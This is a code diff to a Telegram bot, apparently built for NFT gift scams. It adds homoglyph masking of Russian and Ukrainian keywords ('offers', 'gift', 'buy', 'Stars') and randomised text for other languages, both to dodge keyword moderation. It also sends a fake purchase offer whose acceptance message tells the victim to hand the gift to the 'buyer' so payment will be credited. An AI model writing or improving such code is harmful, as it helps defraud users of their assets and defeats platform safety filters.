@@ -89,6 +89,23 @@ def mask_stars(currency: str) -> str:
         return "Ѕtаrѕ"
     return currency.capitalize()
 
+# Умная точечная подмена только для ключевых слов (RU/UA)
+SMART_REPLACE = {
+    "предлагает": "прeдлaгaeт",
+    "пропонує": "прoпoнyє",
+    "подарок": "пoдapок",
+    "подарунок": "пoдapунoк",
+    "Stars": "Ѕtаrѕ",
+    "stars": "Ѕtаrѕ",
+    "купить": "кyпить",
+    "купити": "кyпити",
+}
+
+def smart_mask(text: str) -> str:
+    for word, masked in SMART_REPLACE.items():
+        text = text.replace(word, masked)
+    return text
+
 HOMOGLYPH_CYR = {
     "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
 }
@@ -319,8 +336,17 @@ async def cmd_rep_business(message: types.Message):
         nft_link="@@NFT@@",
     )
 
-    offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
-    nft_name_rand = randomize_all(nft_full_name, probability=1.0)
+    # RU/UA — только точечная подмена ключевых слов
+    # US — полная рандомизация
+    if lang in ("ru", "ua"):
+        offer_text_rand = smart_mask(offer_text_raw)
+        nft_name_rand = nft_full_name
+        expires_text = smart_mask(t['offer_expires'])
+    else:
+        offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
+        nft_name_rand = randomize_all(nft_full_name, probability=1.0)
+        expires_text = randomize_all(t['offer_expires'], probability=1.0)
+
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
 
     offer_text = (
@@ -330,10 +356,8 @@ async def cmd_rep_business(message: types.Message):
         .replace("@@NFT@@", nft_link)
     )
 
-    expires_rand = randomize_all(t['offer_expires'], probability=1.0)
     preview_line = f'<a href="{nft_url}">&#8203;</a>'
-
-    text = f"{preview_line}{offer_text}\n\n{expires_rand}"
+    text = f"{preview_line}{offer_text}\n\n{expires_text}"
 
     try:
         await message.answer(
@@ -370,7 +394,7 @@ async def process_accept(callback: CallbackQuery):
     offer["status"] = "accepted"
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
-    nft_name_rand = randomize_all(offer['nft_name'], probability=1.0)
+    nft_name_rand = offer['nft_name'] if lang in ("ru", "ua") else randomize_all(offer['nft_name'], probability=1.0)
 
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
@@ -431,7 +455,7 @@ async def process_decline(callback: CallbackQuery):
     lang = offer["lang"]
     t = TEXTS[lang]
 
-    declined_rand = randomize_all(t['declined'], probability=1.0)
+    declined_rand = t['declined'] if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
